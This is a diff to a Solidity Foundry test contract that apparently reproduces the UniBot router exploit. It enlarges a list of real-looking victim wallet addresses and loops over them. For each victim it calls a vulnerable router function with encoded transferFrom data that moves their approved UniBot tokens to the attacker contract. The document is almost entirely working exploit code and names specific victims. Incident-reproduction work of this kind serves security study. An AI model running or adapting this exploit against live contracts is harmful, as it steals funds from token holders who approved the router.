@@ -47,7 +47,7 @@ contract IUniBotRouterExploit is Test {
 
         emit log_named_decimal_uint("Attacker UniBot balance before exploit", UniBot.balanceOf(address(this)), UniBot.decimals());
 
-        address[] memory victims = new address[](7);
+        address[] memory victims = new address[](13);
         victims[0] = 0xA20Cb17D888b7E426A3a7Ca2E583706dE48a04f3;
         victims[1] = 0x0d2FC413c1bEEB51f0c91a851Cb27421bccC75aC;
         victims[2] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
@@ -55,19 +55,25 @@ contract IUniBotRouterExploit is Test {
         victims[4] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
         victims[5] = 0xA6C9dA49553bcfec4633F4a0B81FBb4255F590fB;
         victims[6] = 0x4E19e37187Ca00F8eD8B6Ad258c6CaD823AA67b4;
+        victims[7] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;
+        victims[8] = 0x97508F07D974FB02B79bf26bBa7bCE96E0e0985A;
+        victims[9] = 0xB03b67cBae72c26CB262e5299a7FBC44A3f9D60A;
+        victims[10] = 0xEEE050e1C0644364Ba53872f096Ba4F8088eA22F;
+        victims[11] = 0x8523e886556CF1Bb539afF13d339cb1f3F9ecB25;
+        victims[12] = 0x8a1Ee663e8Cd3F967D1814657A8858246ED31444;
 
         bytes4 vulnFunctionSignature = hex"b2bd16ab";
-        address[] memory test = new address[](4);
-        test[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
-        test[1] = address(UniBot);
-        test[2] = address(UniBot);
-        test[3] = address(UniBot);
+        address[] memory first_param = new address[](4);
+        first_param[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
+        first_param[1] = address(UniBot);
+        first_param[2] = address(UniBot);
+        first_param[3] = address(UniBot);
         for (uint i = 0; i < victims.length; i++) {
             uint256 allowance = UniBot.allowance(victims[i], address(router));
             uint256 balance = UniBot.balanceOf(victims[i]);
             balance = allowance < balance ? allowance : balance;
             bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
-            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, test,0,true,100_000, transferFromData,test);
+            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, first_param,0,true,100_000, transferFromData,new address[](1));
             (bool success,bytes memory result) = address(router).call(data);
 
         }
